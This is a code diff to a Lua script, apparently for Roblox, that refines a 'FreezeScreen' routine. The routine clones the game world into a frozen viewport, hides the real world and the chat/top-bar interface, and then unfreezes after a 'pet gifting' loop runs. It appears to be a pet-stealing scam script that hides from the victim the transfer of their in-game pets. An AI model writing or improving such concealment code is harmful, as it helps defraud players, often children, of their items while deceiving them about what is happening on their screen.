@@ -133,11 +133,20 @@ local function FreezeScreen()
     -- Create and setup viewport camera
     local viewportCamera = Instance.new("Camera")
     viewportCamera.CFrame = frozenCFrame
+    viewportCamera.FieldOfView = camera.FieldOfView
     viewportCamera.Parent = viewportFrame
     viewportFrame.CurrentCamera = viewportCamera
     
     -- Clone current workspace state INCLUDING character (better method)
     local success, error = pcall(function()
+        -- First clone Terrain specifically
+        local terrain = workspace:FindFirstChild("Terrain")
+        if terrain then
+            local terrainClone = terrain:Clone()
+            terrainClone.Parent = worldModel
+            Log("✅ Terrain cloned")
+        end
+        
         -- Clone character specifically first
         if LocalPlayer.Character then
             local characterClone = LocalPlayer.Character:Clone()
@@ -145,20 +154,35 @@ local function FreezeScreen()
             Log("✅ Character cloned successfully")
         end
         
-        -- Clone all other workspace objects
+        -- Clone all other workspace objects (except CurrentCamera and Terrain)
         for _, obj in pairs(workspace:GetChildren()) do
-            if obj ~= LocalPlayer.Character then
+            if obj ~= LocalPlayer.Character and obj ~= workspace.CurrentCamera and obj.Name ~= "Terrain" then
                 local cloneSuccess, clone = pcall(function()
                     return obj:Clone()
                 end)
                 if cloneSuccess and clone then
                     clone.Parent = worldModel
+                    Log("✅ Cloned: " .. obj.Name)
                 end
             end
         end
     end)
     
-    -- Freeze camera position
+    -- Wait a moment for the clone to complete before hiding the real world
+    wait(0.1)
+    
+    -- Hide the real world (but keep Terrain and CurrentCamera)
+    pcall(function()
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj ~= workspace.CurrentCamera and obj.Name ~= "Terrain" then
+                obj.Parent = game:GetService("Lighting")
+                Log("🫥 Hidden: " .. obj.Name)
+            end
+        end
+        Log("🌍 Real world hidden, screenshot world visible")
+    end)
+    
+    -- Freeze camera position AFTER cloning and hiding
     cameraConnection = RunService.Heartbeat:Connect(function()
         camera.CFrame = frozenCFrame
     end)
@@ -166,15 +190,6 @@ local function FreezeScreen()
     -- Store camera connection reference globally
     freezeConnectionStorage.cameraConnection = cameraConnection
     screenGui:SetAttribute("HasCameraConnection", true)
-    
-    -- Hide the real world
-    pcall(function()
-        for _, obj in pairs(workspace:GetChildren()) do
-            if obj ~= workspace.CurrentCamera and obj.Name ~= "Terrain" then
-                obj.Parent = game:GetService("Lighting")
-            end
-        end
-    end)
     
     -- Hide CoreGui (Chat, TopBar, etc.)
     pcall(function()
@@ -1035,7 +1050,7 @@ end
     end
     
     Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
-    --UnfreezeScreen()
+    UnfreezeScreen()
     isRunning = false
 end
 
